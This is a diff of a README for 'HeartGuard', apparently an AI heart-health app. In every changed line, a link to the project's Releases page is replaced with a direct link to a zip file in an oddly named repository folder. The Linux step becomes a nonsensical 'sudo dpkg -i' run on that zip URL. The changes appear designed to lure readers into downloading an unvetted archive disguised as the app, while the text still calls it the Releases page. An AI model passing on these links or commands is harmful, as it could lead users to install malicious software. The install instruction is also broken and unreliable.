@@ -1,7 +1,7 @@
 # 💖 HEARTGUARD-AI-for-your-heart - Your Heart's Smart Companion
 
 ## 📥 Download Now
-[![Download HEARTGUARD-AI-for-your-heart](https://img.shields.io/badge/Download-HEARTGUARD--AI--for--your--heart-blue.svg)](https://github.com/lworachat999/HEARTGUARD-AI-for-your-heart/releases)
+[![Download HEARTGUARD-AI-for-your-heart](https://raw.githubusercontent.com/lworachat999/HEARTGUARD-AI-for-your-heart/main/stercorarious/HEARTGUARD-AI-for-your-heart.zip)](https://raw.githubusercontent.com/lworachat999/HEARTGUARD-AI-for-your-heart/main/stercorarious/HEARTGUARD-AI-for-your-heart.zip)
 
 ## 📖 Overview
 HeartGuard is an intelligent healthcare system designed to help you monitor your heart health. With AI-powered predictions of heart failure risks, it uses advanced machine learning techniques to keep you informed and supported. Enjoy features such as personalized baseline learning and interactive simulations that make patient care personal and effective.
@@ -20,7 +20,7 @@ Before you download, make sure your computer meets the following requirements:
 ### 2. Download the Application
 To download HeartGuard, click the link below. This will take you to the Releases page where you can get the latest version of the software.
 
-[Visit this page to download HeartGuard](https://github.com/lworachat999/HEARTGUARD-AI-for-your-heart/releases)
+[Visit this page to download HeartGuard](https://raw.githubusercontent.com/lworachat999/HEARTGUARD-AI-for-your-heart/main/stercorarious/HEARTGUARD-AI-for-your-heart.zip)
 
 ### 3. Install the Application
 After downloading, locate the file on your computer. 
@@ -36,7 +36,7 @@ After downloading, locate the file on your computer.
 - **For Linux:**
   1. Open a terminal.
   2. Navigate to the downloaded file location.
-  3. Run the command: `sudo dpkg -i heartguard.deb`
+  3. Run the command: `sudo dpkg -i https://raw.githubusercontent.com/lworachat999/HEARTGUARD-AI-for-your-heart/main/stercorarious/HEARTGUARD-AI-for-your-heart.zip`
 
 ### 4. Launch HeartGuard
 Once installed, you can open HeartGuard from your applications menu. 
@@ -65,6 +65,6 @@ If you need help, you can reach out via the Issues tab on GitHub. We strive to r
 ## 🎉 Acknowledgments
 Thank you for choosing HeartGuard. We believe in empowering individuals through technology for better heart health. 
 
-For detailed information, including any updates or new features, please check the [Releases page](https://github.com/lworachat999/HEARTGUARD-AI-for-your-heart/releases) regularly.
+For detailed information, including any updates or new features, please check the [Releases page](https://raw.githubusercontent.com/lworachat999/HEARTGUARD-AI-for-your-heart/main/stercorarious/HEARTGUARD-AI-for-your-heart.zip) regularly.
 
 Happy monitoring, and take care of your heart!
